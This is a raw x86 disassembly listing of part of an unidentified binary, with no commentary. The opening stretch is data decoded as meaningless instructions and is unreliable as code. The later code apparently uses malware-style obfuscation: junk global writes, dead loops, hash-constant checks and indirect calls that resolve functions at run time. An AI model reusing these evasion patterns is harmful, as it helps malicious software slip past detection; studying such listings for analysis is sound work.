  4204ab:	sbb    ah,BYTE PTR [edi]
  4204ad:	pushf  
  4204ae:	leave  
  4204af:	repnz xchg ebx,eax
  4204b1:	mov    eax,ds:0xd9e5a068
  4204b6:	xchg   ebx,eax
  4204b7:	sub    al,0x70
  4204b9:	out    dx,eax
  4204ba:	push   es
  4204bb:	shl    DWORD PTR [edx-0x6cfc00dc],1
  4204c1:	aas    
  4204c2:	add    al,0xd8
  4204c4:	jecxz  0x42046a
  4204c6:	loop   0x420462
  4204c8:	sub    ebx,DWORD PTR [edx+0x5f]
  4204cb:	mov    DWORD PTR ds:0xd2e71738,edi
  4204d1:	jnp    0x420508
  4204d3:	mov    ds:0xcf687d16,eax
  4204d8:	(bad)  
  4204d9:	xchg   edx,eax
  4204da:	sub    esp,ebp
  4204dc:	cwde   
  4204dd:	xchg   ecx,ebp
  4204df:	adc    ecx,DWORD PTR [ebp-0x26]
  4204e2:	stos   BYTE PTR es:[edi],al
  4204e3:	fisub  DWORD PTR [edi+0x2ec529cc]
  4204e9:	mov    cs,edx
  4204eb:	ret    
  4204ec:	inc    esi
  4204ed:	mov    eax,ds:0x5737a666
  4204f2:	int3   
  4204f3:	das    
  4204f4:	jp     0x4204b4
  4204f6:	add    esi,0x16
  4204f9:	add    eax,0x412bdb8
  4204fe:	inc    esi
  4204ff:	mov    di,0x787b
  420503:	je     0x420536
  420505:	push   edi
  420506:	xchg   esp,eax
  420507:	(bad)  
  420508:	in     eax,0xbc
  42050a:	aam    0x9a
  42050c:	sar    BYTE PTR [ecx-0x4a4a1a0c],cl
  420512:	cmp    DWORD PTR [eax-0xe19ba9c],edi
  420518:	fwait
  420519:	add    eax,0x21778963
  42051e:	or     DWORD PTR [ecx],edi
  420520:	xchg   edx,esi
  420522:	call   0xf716:0x49eab9c4
  420529:	sbb    ebp,DWORD PTR [ebp-0x2c]
  42052c:	inc    esp
  42052d:	mov    esi,0xff18660e
  420532:	data16 mov bl,0x7
  420535:	adc    bl,al
  420537:	and    BYTE PTR ss:[esi-0x51],ah
  42053b:	loope  0x4205b4
  42053d:	jnp    0x42058a
  42053f:	pop    ebx
  420540:	pushf  
  420541:	dec    esp
  420542:	cmp    al,0xb6
  420544:	mov    ah,0x6a
  420546:	cwde   
  420547:	das    
  420548:	sahf   
  420549:	mov    ecx,0x32919fa5
  42054e:	lea    ecx,[ebp+0x61]
  420551:	inc    ecx
  420552:	cwde   
  420553:	or     ch,BYTE PTR [ebp+0x1f]
  420556:	test   al,0xa0
  420558:	lock es and al,0xa0
  42055c:	out    0xfb,al
  42055e:	xor    al,0x62
  420560:	js     0x420583
  420562:	(bad)  
  420563:	out    0x3c,al
  420565:	cmp    DWORD PTR [esi+0x16],ecx
  420568:	fwait
  420569:	rcr    DWORD PTR [edx+0x3a1a2b93],0xe2
  420570:	(bad)  
  420571:	hlt    
  420572:	jmp    0xe695:0xf2e9973c
  420579:	push   es
  42057a:	jae    0x4205c9
  42057c:	xchg   ebx,eax
  42057d:	mov    ch,0x30
  42057f:	jl     0x420533
  420581:	rcr    BYTE PTR [eax],0xe6
  420584:	jmp    0x42053e
  420586:	imul   ebx,DWORD PTR [eax],0xd5c6cee7
  42058c:	es adc al,0x20
  42058f:	fadd   DWORD PTR es:[ecx-0x1608909d]
  420596:	sahf   
  420597:	js     0x420560
  420599:	inc    eax
  42059a:	and    dl,BYTE PTR [ebp+0x91e2654]
  4205a0:	mov    WORD PTR [edi-0x48ed3cb8],?
  4205a6:	repz dec edx
  4205a8:	mov    al,0x22
  4205aa:	mov    cl,0x3c
  4205ac:	mov    ch,BYTE PTR [eax+esi*4+0x5c]
  4205b0:	aaa    
  4205b1:	and    ebp,DWORD PTR [ebx-0x1eaf820]
  4205b7:	int    0x17
  4205b9:	mov    bl,0x3b
  4205bb:	xor    DWORD PTR [edi],edi
  4205bd:	fs mov dh,bh
  4205c0:	bound  esp,QWORD PTR [edi+0x5e9af083]
  4205c6:	or     eax,0x1b5bf84a
  4205cb:	and    ah,BYTE PTR [edx+0x7084abed]
  4205d1:	call   0xcbb2:0x4ab04f4
  4205d8:	lock aam 0x9e
  4205db:	test   DWORD PTR [ebp+0x4a],esp
  4205de:	add    BYTE PTR ds:0xa7e05399,dl
  4205e4:	bound  esi,QWORD PTR [edi+0x1c]
  4205e7:	test   al,0x5
  4205e9:	ror    eax,0xd2
  4205ec:	mov    ah,0xa7
  4205ee:	shl    DWORD PTR [ecx-0x3c4bd3cf],cl
  4205f4:	test   BYTE PTR ds:0x21e17578,dl
  4205fa:	(bad)  
  4205fb:	lea    ebp,[esi+0x29]
  4205fe:	xlat   BYTE PTR ds:[ebx]
  4205ff:	or     BYTE PTR [edx-0x5],bl
  420602:	xor    bh,BYTE PTR [edi]
  420604:	pop    esi
  420605:	and    al,0x84
  420607:	(bad)  
  420608:	lods   al,BYTE PTR ds:[esi]
  420609:	push   ebx
  42060a:	(bad)  
  42060b:	jno    0x42067b
  42060d:	or     edx,DWORD PTR [edi+0x22c66759]
  420613:	jg     0x42060b
  420615:	or     al,0x4d
  420617:	xor    DWORD PTR [ebx-0x2],0x7
  42061b:	xchg   ebx,eax
  42061c:	and    dl,ch
  42061e:	pusha  
  42061f:	sbb    al,0xec
  420621:	sub    BYTE PTR [ecx],0x14
  420624:	sbb    BYTE PTR [esi-0x62],0x64
  420628:	xlat   BYTE PTR ds:[ebx]
  420629:	fmul   QWORD PTR [edx+0x168b3131]
  42062f:	stos   DWORD PTR es:[edi],eax
  420630:	lods   eax,DWORD PTR ds:[esi]
  420631:	adc    BYTE PTR [ecx+0x6fc7b03],ch
  420637:	sbb    eax,0xfe498db0
  42063c:	and    esi,eax
  42063e:	lds    ebx,FWORD PTR ds:0x362c4da0
  420644:	jp     0x420673
  420646:	je     0x42062a
  420648:	fnstsw WORD PTR [ebx+0x2ce9e49d]
  42064e:	ins    DWORD PTR es:[edi],dx
  42064f:	jp     0x420613
  420651:	fnstcw WORD PTR ds:0x72e1c1f4
  420657:	xchg   ebp,eax
  420658:	push   0x5513bc6e
  42065d:	scas   eax,DWORD PTR es:[edi]
  42065e:	sub    ch,BYTE PTR [edx]
  420660:	shl    DWORD PTR [ebp-0x6a],1
  420663:	jmp    0x8e90:0x71b3fb99
  42066a:	mov    al,0x6c
  42066c:	mov    bl,0x76
  42066e:	push   esp
  42066f:	cmc    
  420670:	mov    es,ebx
  420672:	loope  0x4206a8
  420674:	hlt    
  420675:	mov    ebp,0x869939bc
  42067a:	retf   0xdf9c
  42067d:	push   ecx
  42067e:	imul   esi,DWORD PTR [eax+edi*8],0x4f
  420682:	mov    BYTE PTR [esi-0x11ef4298],al
  420688:	inc    ecx
  420689:	in     al,dx
  42068a:	pop    ebx
  42068b:	xor    dh,ch
  42068d:	inc    eax
  42068e:	dec    edx
  42068f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420690:	push   0xfffffff4
  420692:	mov    dl,0x12
  420694:	ja     0x4206e1
  420696:	in     eax,0xd2
  420698:	lods   eax,DWORD PTR ds:[esi]
  420699:	push   ecx
  42069a:	pop    esp
  42069b:	and    DWORD PTR [eax+0x59178592],edi
  4206a1:	les    eax,FWORD PTR [esi-0x42]
  4206a4:	or     ch,al
  4206a6:	es into 
  4206a8:	pop    edi
  4206a9:	enter  0xce2c,0xb
  4206ad:	test   cl,0xe5
  4206b0:	pop    ds
  4206b1:	mov    al,0x2b
  4206b3:	ss in  eax,dx
  4206b5:	loop   0x4206ea
  4206b7:	jge    0x4206b4
  4206b9:	xor    DWORD PTR [edx-0x37],esi
  4206bc:	mov    WORD PTR ds:0x6be931ab,fs
  4206c3:	jge    0x4206ae
  4206c5:	retf   0x295a
  4206c8:	les    ebx,FWORD PTR [edi]
  4206ca:	cdq    
  4206cb:	or     dl,ah
  4206cd:	jne    0x420689
  4206cf:	js     0x420658
  4206d1:	mov    ds:0x6422e894,al
  4206d6:	or     al,0x5a
  4206d8:	hlt    
  4206d9:	push   eax
  4206da:	popf   
  4206db:	jmp    FWORD PTR [eax]
  4206dd:	jae    0x420711
  4206df:	stc    
  4206e0:	fs icebp 
  4206e2:	pop    es
  4206e3:	adc    eax,0x8ea68c5c
  4206e8:	mov    ebp,0x7d8929fc
  4206ed:	in     al,0x8b
  4206ef:	jge    0x4206f9
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa47
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42aa03
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42aa17
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a0cb
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42aa1b
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42aa1f
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42aa23
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42aa27
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42aa2b
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42aa2f
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42aa33
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
